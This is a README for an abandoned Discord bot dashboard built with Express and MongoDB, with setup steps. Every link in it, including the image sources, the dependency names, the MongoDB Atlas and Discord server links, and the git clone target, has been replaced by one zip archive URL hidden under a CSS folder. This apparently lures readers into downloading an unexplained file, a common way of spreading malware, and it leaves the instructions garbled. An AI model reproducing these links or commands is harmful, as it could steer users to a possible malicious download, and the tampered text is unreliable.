# ⚠️⚠️ NO LONGER MAINTAINED ⚠️⚠️
I no longer have the time to maintain this repository. Therefore, I will not be providing any further fixes or support for the repo, including through my Discord server.

<br>
<br>

<img src="https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip" width="650" height="auto">

# Discord Dashboard Example
A simple Discord Bot Dashboard that is coded with Express, MongoDB and https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip

**Screenshots:** [Click Here](https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip)

## Requirements
- https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip **v19.5.0** or later
- https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip **v14.11.0** or later

## Setup 
1. Create a folder on your computer, then type the following console command to clone this repository.
```bash
git clone https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip
```

2. Create a Discord Application and name it.

![alt text](https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip "Step 2")


3. Rename `https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip` to `.env` and fill the required values from the Discord **OAuth2** and **Bot** Page. **Do not show anyone these!**

4. Install all of the required NPM modules with the following command...
```bash
npm install --save
```

5. Add the callback URL to the Bot's **OAuth2** Page. Click the save button after that.

![alt text](https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip "Step 3")

6. Create a MongoDB database. You can choose between hosting it yourself (locally, VPS) or from [MongoDB Atlas](https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip). Then paste the connection string into the `.env` file. The connection string is in the format of `mongodb://<username>:<password>@<host>:<port>/<database>`. (Might be different!)

7. After filling out the `.env` file, run the following command in the console to deploy the bot commands. This may take up to an hour to process through. Do this once unless you have made major changes to the commands (New Command, changed subcommands, etc).

```bash
npm run deploy
```

8. Start the dashboard.
```bash
node bot
```

## Support and Feedback
Feel free to join the [Discord Server](https://github.com/3yyx/discord-dashboard/raw/refs/heads/master/public/css/dashboard_discord_v1.6.zip) and ask for help in the `#support` and `#bugs` channels. If you have any changes that you like to make to this repo, make a Pull Request and it will be reviewed.
